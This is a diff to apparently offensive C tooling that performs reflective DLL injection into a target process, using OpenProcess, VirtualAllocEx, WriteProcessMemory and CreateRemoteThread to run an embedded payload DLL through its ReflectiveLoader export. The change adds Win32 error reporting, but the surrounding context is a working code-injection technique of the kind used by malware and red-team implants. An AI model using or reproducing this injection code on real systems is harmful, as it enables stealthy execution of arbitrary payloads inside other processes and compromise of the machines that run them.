@@ -16,6 +16,58 @@ static const SIZE_T embedded_dll_len =
     (SIZE_T){{PAYLOAD_BYTES_LEN}};
 
 
+static void print_win32_error(
+    const char *operation
+)
+{
+    DWORD error = GetLastError();
+
+    char message[512] = {0};
+
+    DWORD length = FormatMessageA(
+        FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        error,
+        0,
+        message,
+        (DWORD)sizeof(message),
+        NULL
+    );
+
+    while (
+        length > 0 &&
+        (
+            message[length - 1] == '\r' ||
+            message[length - 1] == '\n'
+        )
+    )
+    {
+        message[--length] = '\0';
+    }
+
+    if (length > 0)
+    {
+        fprintf(
+            stderr,
+            "[-] %s failed: %s (%lu)\n",
+            operation,
+            message,
+            (unsigned long)error
+        );
+    }
+    else
+    {
+        fprintf(
+            stderr,
+            "[-] %s failed: Win32 error %lu\n",
+            operation,
+            (unsigned long)error
+        );
+    }
+}
+
+
 /*
  * Convert an RVA inside the PE into its raw file offset.
  */
@@ -327,6 +379,11 @@ int execute_technique(
         payload_len == 0 ||
         pid == 0)
     {
+        fprintf(
+            stderr,
+            "[-] Invalid technique input\n"
+        );
+
         return -1;
     }
 
@@ -344,6 +401,12 @@ int execute_technique(
     if (!loader_offset ||
         loader_offset >= payload_len)
     {
+        fprintf(
+            stderr,
+            "[-] ReflectiveLoader export "
+            "could not be located\n"
+        );
+
         return -2;
     }
 
@@ -362,7 +425,13 @@ int execute_technique(
     );
 
     if (!hProcess)
+    {
+        print_win32_error(
+            "OpenProcess"
+        );
+
         return -3;
+    }
 
 
     /*
@@ -378,6 +447,10 @@ int execute_technique(
 
     if (!pRemoteImage)
     {
+        print_win32_error(
+            "VirtualAllocEx"
+        );
+
         CloseHandle(hProcess);
         return -4;
     }
@@ -393,6 +466,10 @@ int execute_technique(
             payload_len,
             &bytesWritten))
     {
+        print_win32_error(
+            "WriteProcessMemory"
+        );
+
         VirtualFreeEx(
             hProcess,
             pRemoteImage,
@@ -410,6 +487,14 @@ int execute_technique(
      */
     if (bytesWritten != payload_len)
     {
+        fprintf(
+            stderr,
+            "[-] WriteProcessMemory wrote "
+            "%llu of %llu bytes\n",
+            (unsigned long long)bytesWritten,
+            (unsigned long long)payload_len
+        );
+
         VirtualFreeEx(
             hProcess,
             pRemoteImage,
@@ -464,6 +549,10 @@ int execute_technique(
      */
     if (!hThread)
     {
+        print_win32_error(
+            "CreateRemoteThread"
+        );
+
         VirtualFreeEx(
             hProcess,
             pRemoteImage,
@@ -487,6 +576,22 @@ int execute_technique(
 
     if (wait_result != WAIT_OBJECT_0)
     {
+        if (wait_result == WAIT_FAILED)
+        {
+            print_win32_error(
+                "WaitForSingleObject"
+            );
+        }
+        else
+        {
+            fprintf(
+                stderr,
+                "[-] WaitForSingleObject returned "
+                "unexpected status: 0x%08lX\n",
+                (unsigned long)wait_result
+            );
+        }
+
         CloseHandle(hThread);
         CloseHandle(hProcess);
 
@@ -509,6 +614,10 @@ int execute_technique(
             hThread,
             &thread_exit))
     {
+        print_win32_error(
+            "GetExitCodeThread"
+        );
+
         CloseHandle(hThread);
 
         VirtualFreeEx(
@@ -610,12 +719,6 @@ int main(
 
     if (result != 0)
     {
-        fprintf(
-            stderr,
-            "[-] Technique failed: %d\n",
-            result
-        );
-
         return 1;
     }
 
